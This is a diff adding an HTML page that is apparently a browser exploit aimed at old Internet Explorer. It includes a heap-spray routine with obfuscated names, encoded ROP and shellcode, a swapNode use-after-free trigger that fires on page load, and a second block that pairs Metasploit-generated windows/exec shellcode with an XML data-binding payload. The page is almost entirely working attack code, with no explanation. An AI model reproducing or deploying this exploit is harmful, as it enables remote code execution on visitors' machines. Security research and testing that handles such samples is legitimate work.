@@ -1,0 +1,119 @@
+<html>
+<head>
+<script>
+var nBcMPCSNnPhKTJiQqopAROHHRnI;
+function sprayHeap( oArg ) {
+  var shellcode     = oArg.shellcode;
+  var offset        = oArg.offset;
+  var heapBlockSize = oArg.heapBlockSize;
+  var maxAllocs     = oArg.maxAllocs;
+  var UptCxdlYaggNGpdQvMId         = oArg.UptCxdlYaggNGpdQvMId;
+
+  if (shellcode     == undefined)  { throw "Missing argument: shellcode"; }
+  if (offset        == undefined)  { offset        = 0x00; }
+  if (heapBlockSize == undefined)  { heapBlockSize = 0x80000; }
+  if (maxAllocs     == undefined)  { maxAllocs     = 0x350; }
+
+  if (offset > 0x800) { throw "Bad alignment"; }
+
+  nBcMPCSNnPhKTJiQqopAROHHRnI = document.getElementById(UptCxdlYaggNGpdQvMId);
+
+  if (nBcMPCSNnPhKTJiQqopAROHHRnI == null) {
+    nBcMPCSNnPhKTJiQqopAROHHRnI = document.createElement("div");
+  }
+
+  nBcMPCSNnPhKTJiQqopAROHHRnI.style.cssText = "display:none";
+  var uaMQI;
+  ATGIXkpqnTKjhbKULyyHnRrjfZ = unescape("%u2020%u2020");
+  while (ATGIXkpqnTKjhbKULyyHnRrjfZ.length < offset+0x1000) ATGIXkpqnTKjhbKULyyHnRrjfZ += ATGIXkpqnTKjhbKULyyHnRrjfZ;
+
+  uaMQI = ATGIXkpqnTKjhbKULyyHnRrjfZ.substring(0,offset) + shellcode;
+  uaMQI += ATGIXkpqnTKjhbKULyyHnRrjfZ.substring(0,0x800-offset-shellcode.length);
+
+  while (uaMQI.length < heapBlockSize) uaMQI += uaMQI;
+
+  for (var i = 0; i < maxAllocs; i++)
+  {
+    var UptCxdlYaggNGpdQvM = document.createElement("button");
+    UptCxdlYaggNGpdQvM.title = uaMQI.substring(0, (heapBlockSize-2)/2);
+    nBcMPCSNnPhKTJiQqopAROHHRnI.appendChild(UptCxdlYaggNGpdQvM);
+  }
+}
+sprayHeap({shellcode:unescape("%u868a%u77c3%ub860%u77c3%uffde%uffff%ube18%u77c1%uc01a%u9846%u362c%u77c2%ud9bb%u77c5%ue071%u77c2%u0d13%u77c5%uffc0%uffff%u8fbc%u77c5%ube18%u77c1%u36e7%u232c%u8fbc%u77c5%uee15%u77c3%uee15%u77c3%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3%uc481%ufe0c%uffff%uf7bb%ufaec%udb23%ud9d2%u2474%u5df4%uc929%u01b1%ued83%u31fc%u0f5d%u5d03%u0ef8%uef0f")});
+
+var earth = document;
+var data = "";
+for (i=0; i<17; i++) {
+  if (i==6)      { data += unescape("%u2020%u2030"); }
+  else if (i==7) { data += unescape("%u2020%u2030"); }
+  else           { data += unescape("%u4141%u4141"); }
+}
+data += "\u4141";
+
+function butterfly() {
+  for(i=0; i<20; i++) {
+    var effect = earth.createElement("div");
+    effect.className = data;
+  }
+}
+
+function kaiju() {
+  var godzilla = earth.createElement("textarea");
+  var minilla = earth.createElement("pre");
+  earth.body.appendChild(godzilla);
+  earth.body.appendChild(minilla);
+  godzilla.appendChild(minilla);
+
+  godzilla.onselect=function(e) {
+    minilla.swapNode(earth.createElement("div"));
+  }
+
+  var battleStation = false;
+  var war = new Array();
+  godzilla.onpropertychange=function(e) {
+    if (battleStation == true) {
+      for (i=0; i<50; i++) {
+        war.push(earth.createElement("span"));
+      }
+    }
+
+    earth.execCommand("Unselect");
+
+    if (battleStation == true) {
+      for (i=0; i < war.length; i++) {
+        war[i].className = data;
+      }
+    }
+    else {
+      battleStation = true;
+    }
+  }
+
+  butterfly();
+  godzilla.select();
+}
+</script>
+<script>
+	// windows/exec - 148 bytes
+	// http://www.metasploit.com
+	// Encoder: x86/shikata_ga_nai
+	// EXITFUNC=process, CMD=calc.exe
+	var shellcode = unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580");
+	// ugly heap spray, the d0nkey way!
+	// works most of the time
+	var spray = unescape("%u0a0a%u0a0a");
+	do {
+	   spray += spray;
+	} while(spray.length < 0xd0000);
+	memory = new Array();
+	for(i = 0; i < 100; i++)
+	   memory[i] = spray + shellcode;
+	xmlcode = "<XML ID=I> <X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
+	tag = document.getElementById("replace");
+	tag.innerHTML = xmlcode;
+</script>
+</head>
+<body onload='kaiju()'>
+</body>
+</html>
+    
